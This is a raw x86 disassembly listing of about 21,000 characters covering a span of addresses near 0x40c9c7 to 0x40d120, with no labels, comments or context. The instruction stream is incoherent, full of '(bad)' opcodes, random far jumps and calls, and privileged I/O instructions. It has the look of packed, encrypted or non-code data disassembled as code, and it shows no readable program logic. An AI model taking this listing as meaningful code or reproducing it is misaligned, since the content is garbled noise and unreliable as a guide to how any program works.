  40c9c7:	xchg   esi,eax
  40c9c8:	fsubp  st(6),st
  40c9ca:	mov    ds:0x29540083,eax
  40c9cf:	push   ds
  40c9d0:	push   ebp
  40c9d1:	jbe    0x40c97a
  40c9d3:	push   esi
  40c9d4:	pusha  
  40c9d5:	xchg   edx,eax
  40c9d6:	adc    edx,DWORD PTR [edi*2+0x33057c06]
  40c9dd:	popf   
  40c9de:	loopne 0x40c9c0
  40c9e0:	test   DWORD PTR [edx-0x7f],esi
  40c9e3:	mov    ah,0x8d
  40c9e5:	(bad)  
  40c9e6:	xchg   ebp,eax
  40c9e7:	aaa    
  40c9e8:	ds dec esp
  40c9ea:	dec    ecx
  40c9eb:	xor    eax,0xaf98d64c
  40c9f0:	ins    BYTE PTR es:[edi],dx
  40c9f1:	jnp    0x40ca12
  40c9f3:	mov    esp,0xdf50a8cc
  40c9f8:	inc    eax
  40c9f9:	cmp    eax,0xb9b5e66a
  40c9fe:	inc    eax
  40c9ff:	sbb    eax,0x39d8acec
  40ca04:	add    bl,BYTE PTR [edi+0x31]
  40ca07:	jecxz  0x40ca42
  40ca09:	push   edx
  40ca0a:	and    esp,DWORD PTR [esi+esi*4+0x62]
  40ca0e:	push   eax
  40ca0f:	cmp    dh,dh
  40ca11:	sbb    BYTE PTR es:[esi+0x4cb7fac7],ch
  40ca18:	sbb    ch,BYTE PTR [edi]
  40ca1a:	sub    BYTE PTR [ebp+0x228513e4],ah
  40ca20:	clc    
  40ca21:	pop    es
  40ca22:	je     0x40c9a8
  40ca24:	xor    edx,DWORD PTR [edx+ecx*1]
  40ca27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca28:	test   BYTE PTR [edx-0x25],al
  40ca2b:	sub    esp,eax
  40ca2d:	sti    
  40ca2e:	mov    ebp,0xafb856e3
  40ca33:	in     al,dx
  40ca34:	xor    esi,esp
  40ca36:	jb     0x40c9d8
  40ca38:	xrelease mov DWORD PTR [esi*4-0x3517e55a],edi
  40ca40:	fdivr  QWORD PTR [ecx-0x27]
  40ca43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca44:	and    dh,BYTE PTR [edx+edi*1]
  40ca47:	jl     0x40ca19
  40ca49:	mov    ch,al
  40ca4b:	lods   eax,DWORD PTR ds:[esi]
  40ca4c:	sahf   
  40ca4d:	int    0x17
  40ca4f:	xlat   BYTE PTR ds:[ebx]
  40ca50:	aaa    
  40ca51:	mov    dh,0x85
  40ca53:	outs   dx,DWORD PTR ds:[esi]
  40ca54:	dec    eax
  40ca55:	pushf  
  40ca56:	jecxz  0x40cab0
  40ca58:	push   es
  40ca59:	outs   dx,DWORD PTR ds:[esi]
  40ca5a:	enter  0xe20,0xfa
  40ca5e:	mov    BYTE PTR [eax-0x6b],dh
  40ca61:	and    cl,cl
  40ca63:	push   ebp
  40ca64:	mov    ah,0x71
  40ca66:	cmovb  ecx,DWORD PTR [edx]
  40ca69:	jp     0x40cad7
  40ca6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca6c:	dec    edi
  40ca6d:	xor    al,0xe6
  40ca6f:	aas    
  40ca70:	mov    ah,0xa2
  40ca72:	and    DWORD PTR [ebx+0x2e],0x42
  40ca76:	ja     0x40ca8e
  40ca78:	lahf   
  40ca79:	fucom  st(0)
  40ca7b:	or     dl,ch
  40ca7d:	push   ecx
  40ca7e:	fild   QWORD PTR [ebx]
  40ca80:	dec    edi
  40ca81:	pop    ecx
  40ca82:	fcomp  QWORD PTR [edx+eiz*1-0xe772124]
  40ca89:	add    esp,DWORD PTR [ebp-0x6b]
  40ca8c:	mov    edx,DWORD PTR [edx]
  40ca8e:	xor    BYTE PTR [ebx-0x39f9d8bf],ah
  40ca94:	dec    edx
  40ca95:	dec    eax
  40ca96:	bnd jl 0x40cabe
  40ca99:	jne    0x40cac5
  40ca9b:	ja     0x40ca2a
  40ca9d:	repnz or eax,0xd48307b4
  40caa3:	sar    dh,0x3f
  40caa6:	in     al,0x68
  40caa8:	push   0x56
  40caaa:	cmp    ebp,DWORD PTR [ebx+0x4213f14d]
  40cab0:	mov    ebp,0x307ba891
  40cab5:	sbb    dl,ah
  40cab7:	inc    esi
  40cab8:	into   
  40cab9:	add    BYTE PTR [eax],bl
  40cabb:	mov    esi,0x21f9077
  40cac0:	push   edi
  40cac1:	ja     0x40ca5a
  40cac3:	pop    esp
  40cac4:	dec    ecx
  40cac5:	das    
  40cac6:	addr16 and al,0x55
  40cac9:	pop    ss
  40caca:	mov    bl,0xbd
  40cacc:	test   eax,0x50b3064f
  40cad1:	xchg   esp,eax
  40cad2:	push   edx
  40cad3:	jo     0x40cac5
  40cad5:	gs push esi
  40cad7:	test   al,0xbf
  40cad9:	mov    ds:0x3793d45,eax
  40cade:	lock inc ecx
  40cae0:	out    dx,eax
  40cae1:	push   esi
  40cae2:	lods   al,BYTE PTR ds:[esi]
  40cae3:	in     eax,0x9d
  40cae5:	xor    al,0xa2
  40cae7:	inc    eax
  40cae8:	(bad)  
  40cae9:	mov    esi,0x1ee19a70
  40caee:	mov    ebx,0x7af9e008
  40caf3:	jbe    0x40caaa
  40caf5:	je     0x40cb36
  40caf7:	stc    
  40caf8:	add    BYTE PTR [edi-0x3ec2f090],bh
  40cafe:	xor    cl,BYTE PTR [esi-0x5f01eabb]
  40cb04:	jbe    0x40cb17
  40cb06:	sbb    esp,ecx
  40cb08:	pop    ebx
  40cb09:	lahf   
  40cb0a:	lds    esi,FWORD PTR [ecx+0x4e6b4c03]
  40cb10:	mov    edx,0xf65d805b
  40cb15:	(bad)  
  40cb16:	fadd   st,st(4)
  40cb18:	mov    esp,0xaeee8c85
  40cb1d:	outs   dx,DWORD PTR ds:[esi]
  40cb1e:	mov    ds:0x335acc17,eax
  40cb23:	jns    0x40cb19
  40cb25:	stos   DWORD PTR es:[edi],eax
  40cb26:	adc    edx,DWORD PTR [esi-0x49526420]
  40cb2c:	int    0x69
  40cb2e:	fld    DWORD PTR [eax]
  40cb30:	xor    esi,ebx
  40cb32:	shl    DWORD PTR [ecx],cl
  40cb34:	xchg   DWORD PTR [ecx+0x1d],ebp
  40cb37:	push   ds
  40cb38:	arpl   WORD PTR [esi-0x22788430],si
  40cb3e:	push   es
  40cb3f:	imul   eax,ebx,0x2f915703
  40cb45:	mov    WORD PTR [ecx],fs
  40cb47:	inc    esp
  40cb48:	add    DWORD PTR [esi-0x39a7ca82],eax
  40cb4e:	stos   DWORD PTR es:[edi],eax
  40cb4f:	sbb    eax,0xf5b5dc66
  40cb54:	add    edx,esp
  40cb56:	sub    edx,eax
  40cb58:	push   es
  40cb59:	or     eax,0xdcc1a3a8
  40cb5e:	(bad)  
  40cb5f:	adc    cl,BYTE PTR [edi-0x51756b08]
  40cb65:	add    BYTE PTR [ecx],bh
  40cb67:	push   0xe3d82ffe
  40cb6c:	jecxz  0x40cbda
  40cb6e:	inc    ebx
  40cb6f:	mov    dl,ah
  40cb71:	aam    0xd1
  40cb73:	repnz dec esp
  40cb75:	ins    BYTE PTR es:[edi],dx
  40cb76:	int3   
  40cb77:	pop    ebx
  40cb78:	fs mov ebx,0xea292ab7
  40cb7e:	mov    ax,0xcf9
  40cb82:	push   cs
  40cb83:	or     BYTE PTR [ebp+0x351f0102],bl
  40cb89:	cmp    dl,BYTE PTR [ebp-0x57af2e6d]
  40cb8f:	das    
  40cb90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb91:	xor    esp,DWORD PTR [esi-0x17]
  40cb94:	mov    ah,0x2f
  40cb96:	call   0x3778:0x470cdba1
  40cb9d:	pop    es
  40cb9e:	js     0x40cba3
  40cba0:	xchg   edx,eax
  40cba1:	imul   esp,edx,0x49075f21
  40cba7:	inc    edi
  40cba8:	outs   dx,DWORD PTR ds:[esi]
  40cba9:	and    DWORD PTR [ebx+0xa],ecx
  40cbac:	dec    ebx
  40cbad:	pop    ebp
  40cbae:	(bad)  
  40cbaf:	ret    0x4029
  40cbb2:	out    0xe5,eax
  40cbb4:	fld    DWORD PTR [ebp+0x4a09e05f]
  40cbba:	and    BYTE PTR [eax+0x1b],0x89
  40cbbe:	jbe    0x40cc12
  40cbc0:	leave  
  40cbc1:	(bad)
  40cbc4:	out    0xa,eax
  40cbc6:	xchg   esp,eax
  40cbc7:	sub    al,0xfc
  40cbc9:	sbb    ecx,DWORD PTR [edi-0x6f27ae82]
  40cbcf:	mov    WORD PTR [ebp+0x7f2772ad],cs
  40cbd5:	js     0x40cbb6
  40cbd7:	push   edx
  40cbd8:	in     al,dx
  40cbd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbda:	pushf  
  40cbdb:	std    
  40cbdc:	outs   dx,DWORD PTR ds:[esi]
  40cbdd:	js     0x40cb7c
  40cbdf:	cdq    
  40cbe0:	repnz dec eax
  40cbe2:	das    
  40cbe3:	xor    ebx,DWORD PTR [ecx]
  40cbe5:	adc    esi,DWORD PTR [ebx-0x80]
  40cbe8:	fxam   
  40cbea:	ret    
  40cbeb:	mov    BYTE PTR [edi+0x1d],0xb5
  40cbef:	into   
  40cbf0:	xor    cl,ch
  40cbf2:	(bad)  
  40cbf3:	fsubr  QWORD PTR [eax-0x3352237b]
  40cbf9:	(bad)  
  40cbfa:	adc    dh,BYTE PTR [esp+esi*2-0x68]
  40cbfe:	push   0x507caefa
  40cc03:	int3   
  40cc04:	test   DWORD PTR [eax+0x54169130],ecx
  40cc0a:	adc    DWORD PTR [ebp-0x33],0x75
  40cc0e:	lgs    ebx,FWORD PTR [eax-0x2abb254d]
  40cc15:	pop    ss
  40cc16:	push   ss
  40cc17:	test   eax,0xf902cae6
  40cc1c:	lahf   
  40cc1d:	jno    0x40cbde
  40cc1f:	cld    
  40cc20:	or     BYTE PTR [ebx+0x2f],ah
  40cc23:	fldenv [edx+ecx*1-0x55]
  40cc27:	imul   ebx,DWORD PTR [ebx*2+0x215e7c5d],0xe01090cd
  40cc32:	int3   
  40cc33:	(bad)  
  40cc34:	jnp    0x40cc55
  40cc36:	xor    bl,BYTE PTR [ebx-0x53758a17]
  40cc3c:	inc    ecx
  40cc3d:	outs   dx,BYTE PTR ds:[esi]
  40cc3e:	inc    ebp
  40cc3f:	aas    
  40cc40:	test   BYTE PTR [edi-0x2e8ca901],ch
  40cc46:	xlat   BYTE PTR ds:[ebx]
  40cc47:	dec    esp
  40cc48:	mov    bl,BYTE PTR [ebp+0x50]
  40cc4b:	iret   
  40cc4c:	mov    eax,DWORD PTR [ebx+0x3d]
  40cc4f:	fwait
  40cc50:	repz push edx
  40cc52:	mov    ebp,0xe2345cb7
  40cc57:	pop    es
  40cc58:	inc    edi
  40cc59:	xor    al,0x81
  40cc5b:	ins    DWORD PTR es:[edi],dx
  40cc5c:	mov    ecx,0xdb2e7b1b
  40cc61:	xor    BYTE PTR [edi-0x76],dh
  40cc64:	fs push es
  40cc66:	sbb    DWORD PTR [ebp+0x5f9d2de3],0x25
  40cc6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc6e:	sub    bh,BYTE PTR es:[eax-0x30]
  40cc72:	xor    eax,DWORD PTR [edx]
  40cc74:	jp     0x40cc4b
  40cc76:	mov    bl,0x63
  40cc78:	stos   BYTE PTR es:[edi],al
  40cc79:	xchg   edi,eax
  40cc7a:	int3   
  40cc7b:	inc    edx
  40cc7c:	out    0x30,al
  40cc7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc7f:	xchg   ebx,eax
  40cc80:	push   es
  40cc81:	push   ebp
  40cc82:	xchg   edi,edi
  40cc84:	adc    DWORD PTR [ebx],ebx
  40cc86:	dec    ecx
  40cc87:	add    esi,ebp
  40cc89:	shl    BYTE PTR [ecx-0x3ae0ee58],1
  40cc8f:	cmp    al,0x13
  40cc91:	retf   
  40cc92:	cmp    esi,edx
  40cc94:	sub    BYTE PTR [edi],dl
  40cc96:	and    eax,0xb1381e93
  40cc9b:	push   ecx
  40cc9c:	mov    esi,0xb5d7b872
  40cca1:	fistp  DWORD PTR [esi-0x3a]
  40cca4:	dec    eax
  40cca5:	ja     0x40cc4d
  40cca7:	xchg   edx,eax
  40cca8:	cmp    eax,0xba206948
  40ccad:	sub    al,ah
  40ccaf:	xchg   edx,eax
  40ccb0:	mov    WORD PTR [edx-0x7b1289b5],?
  40ccb6:	ret    
  40ccb7:	jne    0x40cd06
  40ccb9:	pop    ds
  40ccba:	jecxz  0x40cc9d
  40ccbc:	fistp  WORD PTR [ecx+0x7dddfaa8]
  40ccc2:	dec    ebx
  40ccc3:	add    al,0x69
  40ccc5:	std    
  40ccc6:	or     eax,0xdedb3834
  40cccb:	xchg   BYTE PTR [esi],cl
  40cccd:	es ja  0x40cd4c
  40ccd0:	pop    esi
  40ccd1:	inc    edx
  40ccd2:	(bad)  [eax+edx*4-0x3151ee43]
  40ccd9:	dec    edx
  40ccda:	sbb    BYTE PTR [esi],ah
  40ccdc:	imul   edi,DWORD PTR [eax+edi*1],0xffffffab
  40cce0:	dec    edx
  40cce1:	mov    edx,0xfd4f5ca9
  40cce6:	adc    BYTE PTR [edi],ch
  40cce8:	push   ss
  40cce9:	push   edx
  40ccea:	lahf   
  40cceb:	outs   dx,BYTE PTR ds:[esi]
  40ccec:	xor    bl,ch
  40ccee:	data16 sti 
  40ccf0:	inc    esp
  40ccf1:	mov    al,BYTE PTR [edi+eax*8+0x76bed860]
  40ccf8:	retf   
  40ccf9:	data16 (bad) 
  40ccfb:	adc    ch,BYTE PTR [edx+ecx*1+0x23]
  40ccff:	add    esi,ebx
  40cd01:	cmp    esp,esp
  40cd03:	cld    
  40cd04:	or     DWORD PTR [ecx],0x5f
  40cd07:	mov    dh,0x74
  40cd09:	mov    dh,0xe6
  40cd0b:	mov    edi,0xfa91a435
  40cd10:	dec    eax
  40cd11:	ss loop 0x40ccdf
  40cd14:	mov    esi,0xcff2b055
  40cd19:	push   esp
  40cd1a:	pushf  
  40cd1b:	jne    0x40cd35
  40cd1d:	xlat   BYTE PTR ds:[ebx]
  40cd1e:	repz sbb al,0x7
  40cd21:	rol    DWORD PTR [esi],cl
  40cd23:	scas   eax,DWORD PTR es:[edi]
  40cd24:	add    ebx,esp
  40cd26:	stos   DWORD PTR es:[edi],eax
  40cd27:	dec    ebp
  40cd28:	(bad)  
  40cd29:	cdq    
  40cd2a:	je     0x40cd46
  40cd2c:	imul   esi,esp,0x6cc443a3
  40cd32:	mov    WORD PTR [edx-0x357124e6],gs
  40cd38:	jae    0x40cd5b
  40cd3a:	jge    0x40cd1c
  40cd3c:	or     al,0x37
  40cd3e:	sar    ch,0x13
  40cd41:	jo     0x40ccf1
  40cd43:	add    DWORD PTR [eax+0x19],edx
  40cd46:	push   ebx
  40cd47:	not    DWORD PTR [ecx+0x66]
  40cd4a:	adc    DWORD PTR [ecx],esp
  40cd4c:	jmp    0x66ee:0x6c786fa6
  40cd53:	pop    ebp
  40cd54:	ss dec edx
  40cd56:	and    esp,DWORD PTR [ecx+0x108c8c1e]
  40cd5c:	add    BYTE PTR [edi-0x30b6a88b],cl
  40cd62:	sub    al,0x1f
  40cd64:	sub    esi,DWORD PTR [ebx-0x6fce39b9]
  40cd6a:	xor    eax,0x67f1b8e2
  40cd6f:	xor    eax,0xa860d7ab
  40cd74:	push   ebp
  40cd75:	scas   al,BYTE PTR es:[edi]
  40cd76:	cmp    eax,0xa921cab2
  40cd7b:	and    al,0x1c
  40cd7d:	xchg   ebx,eax
  40cd7e:	shl    DWORD PTR [ebp-0x3a],cl
  40cd81:	lea    eax,[esi+0x7a]
  40cd84:	outs   dx,DWORD PTR ds:[esi]
  40cd85:	ja     0x40cd09
  40cd87:	mov    eax,0xc5ddeed6
  40cd8c:	and    ecx,ebp
  40cd8e:	aaa    
  40cd8f:	sbb    ah,BYTE PTR [esi+esi*4-0x22]
  40cd93:	inc    eax
  40cd94:	je     0x40cd35
  40cd96:	out    0x91,eax
  40cd98:	dec    esp
  40cd99:	lahf   
  40cd9a:	pop    ebp
  40cd9b:	push   eax
  40cd9c:	sub    BYTE PTR [ebp+0x15],0x1e
  40cda0:	stc    
  40cda1:	or     bl,BYTE PTR [esi]
  40cda3:	adc    eax,0x461f705c
  40cda8:	frstor ds:0x7aedd99c
  40cdae:	test   bh,0x96
  40cdb1:	add    DWORD PTR [ecx+0x58f6380f],esp
  40cdb7:	adc    BYTE PTR [edx-0x474d5b61],bl
  40cdbd:	inc    eax
  40cdbe:	ss ja  0x40cde0
  40cdc1:	cmp    eax,ecx
  40cdc3:	and    BYTE PTR gs:[edi+edx*4+0x71],dh
  40cdc8:	and    DWORD PTR [ebx+0x1d],edx
  40cdcb:	pushf  
  40cdcc:	in     eax,dx
  40cdcd:	popf   
  40cdce:	jmp    0x40cde2
  40cdd0:	std    
  40cdd1:	imul   ebp,DWORD PTR [ebp+edi*4+0x4ac40195],0x5a75214c
  40cddc:	(bad)  
  40cddd:	cmp    al,0x22
  40cddf:	xchg   ebx,eax
  40cde0:	cli    
  40cde1:	pop    ecx
  40cde2:	or     BYTE PTR ds:0x41a7b4cf,bh
  40cde8:	(bad)  
  40cde9:	mov    edx,0x5ec380f9
  40cdee:	std    
  40cdef:	xor    al,0xbe
  40cdf1:	jne    0x40ce05
  40cdf3:	fmul   QWORD PTR [eax]
  40cdf5:	inc    ecx
  40cdf6:	or     BYTE PTR [ecx],ah
  40cdf8:	test   DWORD PTR ds:0x973916d,0x3661cb62
  40ce02:	sar    DWORD PTR [eax+0x3277e56c],cl
  40ce08:	stos   BYTE PTR es:[edi],al
  40ce09:	adc    cl,BYTE PTR [ebx-0x1427025]
  40ce0f:	mov    cl,0x60
  40ce11:	cmp    eax,0x6304e664
  40ce16:	add    dl,dh
  40ce18:	add    DWORD PTR [eax],esp
  40ce1a:	add    al,ah
  40ce1c:	cli    
  40ce1d:	add    edx,edx
  40ce1f:	mov    al,0x98
  40ce21:	out    dx,al
  40ce22:	hlt    
  40ce23:	inc    esi
  40ce24:	stos   BYTE PTR es:[edi],al
  40ce25:	and    al,0xd
  40ce27:	sub    ecx,ecx
  40ce29:	jb     0x40ce15
  40ce2b:	or     DWORD PTR [ebp+0xc],0x294a97f8
  40ce32:	sub    eax,0x6675d9d2
  40ce37:	fistp  WORD PTR [edx]
  40ce39:	mov    ebx,0xf73d062c
  40ce3e:	mov    ds:0x8ae78106,al
  40ce43:	cwde   
  40ce44:	sbb    BYTE PTR [ecx-0x115d008a],0xd5
  40ce4b:	neg    BYTE PTR [ecx+eiz*2]
  40ce4e:	cwde   
  40ce4f:	rcl    DWORD PTR [edx+0x71236d4b],cl
  40ce55:	arpl   WORD PTR [eax-0x372002d7],dx
  40ce5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce5c:	jle    0x40ce9d
  40ce5e:	cmp    BYTE PTR [ebp-0x4af2488f],bl
  40ce64:	dec    ebx
  40ce65:	jmp    0x4fcaa8fb
  40ce6a:	outs   dx,DWORD PTR ds:[esi]
  40ce6b:	loopne 0x40ce92
  40ce6d:	or     DWORD PTR [eax],ebp
  40ce6f:	les    ebx,FWORD PTR [edi+0x15f44f68]
  40ce75:	rcl    DWORD PTR [esi+esi*8+0x12],0x25
  40ce7a:	bound  eax,QWORD PTR [edx+0x69]
  40ce7d:	call   0x9bb245c3
  40ce82:	loopne 0x40ced1
  40ce84:	and    eax,ebx
  40ce86:	(bad)  
  40ce87:	mov    esp,0x95515208
  40ce8c:	xchg   ebx,eax
  40ce8d:	push   ds
  40ce8e:	loope  0x40ce88
  40ce90:	jp     0x40ce90
  40ce92:	out    dx,al
  40ce93:	sbb    al,0x2c
  40ce95:	mov    ecx,0x7a3f9c03
  40ce9a:	cmc    
  40ce9b:	mov    DWORD PTR [edi-0x4fc7cd97],esp
  40cea1:	scas   al,BYTE PTR es:[edi]
  40cea2:	adc    cl,BYTE PTR [edx+0x526ad817]
  40cea8:	xor    dh,bh
  40ceaa:	das    
  40ceab:	into   
  40ceac:	fs aaa 
  40ceae:	sbb    eax,edi
  40ceb0:	cmc    
  40ceb1:	jbe    0x40ce4b
  40ceb3:	pusha  
  40ceb4:	jnp    0x40ceed
  40ceb6:	(bad)  
  40ceb7:	mov    edx,0xe1efd18e
  40cebc:	pop    esi
  40cebd:	sbb    DWORD PTR [esp+ebp*4-0x7b],eax
  40cec1:	inc    BYTE PTR ss:[ecx+ecx*8]
  40cec5:	jp     0x40cf27
  40cec7:	mov    ah,0xd6
  40cec9:	ret    0x2a4b
  40cecc:	das    
  40cecd:	pop    ds
  40cece:	repz imul edi,DWORD PTR [ebx+ecx*1],0x836326ce
  40ced6:	cld    
  40ced7:	daa    
  40ced8:	adc    BYTE PTR [esp+eiz*4],bh
  40cedb:	(bad)  
  40cedc:	neg    ebp
  40cede:	popa   
  40cedf:	mov    ebx,0x97f95c58
  40cee4:	std    
  40cee5:	ret    0xb374
  40cee8:	clc    
  40cee9:	shl    DWORD PTR [eax+ebx*4-0x47],1
  40ceed:	jg     0x40cede
  40ceef:	sub    BYTE PTR es:[edx+0x5],cl
  40cef3:	xor    al,0xa3
  40cef5:	dec    ebx
  40cef6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cef7:	push   ebx
  40cef8:	loop   0x40cf5f
  40cefa:	std    
  40cefb:	mov    WORD PTR [edi+ebx*4+0x3a60cc17],?
  40cf02:	inc    esi
  40cf03:	jne    0x40cef4
  40cf05:	push   es
  40cf06:	iret   
  40cf07:	xchg   edi,eax
  40cf08:	adc    al,cl
  40cf0a:	cmp    bl,BYTE PTR [ecx+esi*1-0x33]
  40cf0e:	(bad)
  40cf11:	xchg   ebp,eax
  40cf12:	arpl   WORD PTR [ebx-0x26],si
  40cf15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf16:	rcl    esi,1
  40cf18:	(bad)  
  40cf19:	fnstenv [ecx+0x55]
  40cf1c:	push   ebx
  40cf1d:	sub    edi,DWORD PTR [edx]
  40cf1f:	pusha  
  40cf20:	jo     0x40cea8
  40cf22:	jecxz  0x40cf40
  40cf24:	cli    
  40cf25:	mov    ecx,0x9d2cbbdf
  40cf2a:	mov    ah,0xb8
  40cf2c:	xchg   edx,eax
  40cf2d:	(bad)  
  40cf2e:	and    DWORD PTR [edi-0x639ffb82],eax
  40cf34:	mov    WORD PTR [esi],ds
  40cf36:	sub    DWORD PTR [esi],esi
  40cf38:	push   esi
  40cf39:	jne    0x40cee9
  40cf3b:	dec    ebp
  40cf3c:	jg     0x40cee7
  40cf3e:	(bad)  
  40cf3f:	lds    ebx,FWORD PTR [esi-0x59cd34ad]
  40cf45:	sub    ah,BYTE PTR [edi+0x6f]
  40cf48:	shl    BYTE PTR [edi+0x36],cl
  40cf4b:	lods   eax,DWORD PTR ds:[esi]
  40cf4c:	adc    ch,BYTE PTR [esp+edx*1]
  40cf4f:	ret    0x318b
  40cf52:	imul   ecx,DWORD PTR [esi+0x71],0x50cfac40
  40cf59:	retf   0x5ee
  40cf5c:	bound  eax,QWORD PTR ds:0x71d70737
  40cf62:	inc    edi
  40cf63:	data16 ffreep st(4)
  40cf66:	outs   dx,BYTE PTR ds:[esi]
  40cf67:	sub    ebp,DWORD PTR [eax]
  40cf69:	xchg   edi,eax
  40cf6a:	shr    DWORD PTR [esi-0x6cd2aaba],cl
  40cf70:	rcl    edx,0xa0
  40cf73:	or     DWORD PTR [edx+edx*1],0x608b34ba
  40cf7a:	ins    DWORD PTR es:[edi],dx
  40cf7b:	sbb    eax,0xf7d859a9
  40cf80:	out    dx,eax
  40cf81:	dec    ebp
  40cf82:	or     eax,0x311ca539
  40cf87:	jge    0x40cf0b
  40cf89:	mov    edi,DWORD PTR ds:0x5cd9fc43
  40cf8f:	cmp    ch,BYTE PTR [ecx+0x66a717cf]
  40cf95:	(bad)  
  40cf96:	popa   
  40cf97:	pop    ds
  40cf98:	cmp    eax,0xf400dd5b
  40cf9d:	sbb    cl,al
  40cf9f:	cmp    ah,BYTE PTR [edx+0x25]
  40cfa2:	pusha  
  40cfa3:	push   ds
  40cfa4:	sub    eax,0x46b4a300
  40cfa9:	sub    DWORD PTR [ebp+0x48],ecx
  40cfac:	loop   0x40cfaa
  40cfae:	mov    ds:0x62e5c916,al
  40cfb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfb4:	jmp    0x9bbd:0xe05e6a80
  40cfbb:	leave  
  40cfbc:	push   es
  40cfbd:	mov    BYTE PTR [eax-0x6eceba8b],dl
  40cfc3:	xor    eax,0x2ffa60ed
  40cfc8:	fldenv [esi-0x695b38fb]
  40cfce:	adc    cl,BYTE PTR [ecx-0x68]
  40cfd1:	push   ecx
  40cfd2:	jne    0x40cf7d
  40cfd4:	mov    ecx,0x9815c9a9
  40cfd9:	and    BYTE PTR [ebx],dh
  40cfdb:	stc    
  40cfdc:	adc    al,0x37
  40cfde:	ds nop
  40cfe0:	test   DWORD PTR [edx+0x5aac8c5],edi
  40cfe6:	test   al,0x8e
  40cfe8:	or     ebp,ecx
  40cfea:	dec    BYTE PTR [esp+ebx*4]
  40cfed:	push   ss
  40cfee:	or     al,0x6
  40cff0:	(bad)  
  40cff1:	jle    0x40cfab
  40cff3:	fstp   TBYTE PTR [ebx+ebx*1-0x7371dad9]
  40cffa:	ins    DWORD PTR es:[edi],dx
  40cffb:	mov    esp,0xc0edf478
  40d000:	mov    WORD PTR [ebx],?
  40d002:	jns    0x40d04b
  40d004:	mov    eax,0xe416a272
  40d009:	jae    0x40cfba
  40d00b:	push   ebp
  40d00c:	sub    BYTE PTR [esp+esi*1-0x5a],ah
  40d010:	btc    DWORD PTR [edx],edx
  40d013:	cmp    ah,BYTE PTR [ebx]
  40d015:	mov    bh,0x64
  40d017:	lock dec edx
  40d019:	inc    edi
  40d01a:	mov    ds:0x80731ae0,eax
  40d01f:	dec    edx
  40d020:	scas   eax,DWORD PTR es:[edi]
  40d021:	daa    
  40d022:	imul   ebx,DWORD PTR [edx-0x53],0xdaace655
  40d029:	mov    edi,0x168d1cba
  40d02e:	adc    DWORD PTR [eax],0xffffff93
  40d031:	inc    ecx
  40d032:	mov    al,ds:0xb22e340b
  40d037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d038:	mov    eax,ds:0xb3212b76
  40d03d:	dec    ebx
  40d03e:	or     al,0xc2
  40d040:	sub    eax,0x47d01fcf
  40d045:	jl     0x40d034
  40d047:	cs mov esi,0x8d3df16c
  40d04d:	ficomp WORD PTR ds:0x5ea26dfb
  40d053:	inc    ebp
  40d054:	sub    eax,0x968d7ed
  40d059:	test   al,0xd2
  40d05b:	add    DWORD PTR [esi+0x7f],edx
  40d05e:	inc    ebx
  40d05f:	xor    al,0xf5
  40d061:	add    BYTE PTR [ebx-0x6a],dh
  40d064:	adc    al,0xfe
  40d066:	jmp    0x8bb7:0xc996b5f
  40d06d:	xor    al,0xca
  40d06f:	jle    0x40d062
  40d071:	(bad)  
  40d072:	jb     0x40d02d
  40d074:	retf   
  40d075:	sbb    eax,eax
  40d077:	sbb    DWORD PTR [eax],edx
  40d079:	ret    
  40d07a:	mov    eax,0x9f023625
  40d07f:	pushf  
  40d080:	mov    bl,dh
  40d082:	pop    eax
  40d083:	cmp    esi,DWORD PTR [eax]
  40d085:	fxch   st(5)
  40d087:	lahf   
  40d088:	inc    ecx
  40d089:	cld    
  40d08a:	hlt    
  40d08b:	imul   esp,DWORD PTR [ecx],0xffffffdb
  40d08e:	sbb    eax,0x19a4db4e
  40d093:	std    
  40d094:	mov    ah,0x47
  40d096:	push   edi
  40d097:	sub    DWORD PTR ds:0x21855b18,edx
  40d09d:	lock outs dx,DWORD PTR ds:[esi]
  40d09f:	leave  
  40d0a0:	or     BYTE PTR [ebx+0xc329532],ch
  40d0a6:	mov    dh,0xb5
  40d0a8:	sbb    BYTE PTR [ebx+0x38],bl
  40d0ab:	je     0x40d0f6
  40d0ad:	sar    DWORD PTR [ecx+0x5b],0x75
  40d0b1:	push   ebx
  40d0b2:	ret    0xf7d5
  40d0b5:	inc    ebp
  40d0b6:	js     0x40d125
  40d0b8:	dec    ecx
  40d0b9:	push   0x98606890
  40d0be:	mov    bl,ch
  40d0c0:	scas   eax,DWORD PTR es:[edi]
  40d0c1:	cwde   
  40d0c2:	and    BYTE PTR [eax],dl
  40d0c4:	imul   eax,esp,0x1fbaf802
  40d0ca:	pop    ebp
  40d0cb:	fstp   DWORD PTR [edi]
  40d0cd:	pop    ds
  40d0ce:	fs pop edx
  40d0d0:	cpuid  
  40d0d2:	sbb    eax,0xb5802a01
  40d0d7:	or     BYTE PTR [ecx+0x252154a9],cl
  40d0dd:	ret    0xd14d
  40d0e0:	dec    ecx
  40d0e1:	sub    eax,0xf352e12d
  40d0e6:	js     0x40d07c
  40d0e8:	dec    ecx
  40d0e9:	pop    edx
  40d0ea:	jecxz  0x40d0f7
  40d0ec:	call   0x358b20a2
  40d0f1:	add    BYTE PTR [eax],ah
  40d0f3:	retw   
  40d0f5:	cmp    bh,BYTE PTR [ebx+0x6b7dd7ff]
  40d0fb:	mov    edi,0x187fa098
  40d100:	call   0x845a:0xd728dd73
  40d107:	imul   DWORD PTR [ecx-0xd9c5bae]
  40d10d:	cmp    esi,eax
  40d10f:	hlt    
  40d110:	jp     0x40d18c
  40d112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d113:	les    ebx,FWORD PTR [edi]
  40d115:	inc    esi
  40d116:	dec    esi
  40d117:	or     BYTE PTR [eax],al
  40d119:	lods   al,BYTE PTR ds:[esi]
  40d11a:	sbb    eax,0x7e3074bd
  40d11f:	lods   eax,DWORD PTR ds:[esi]
  40d120:	popa   
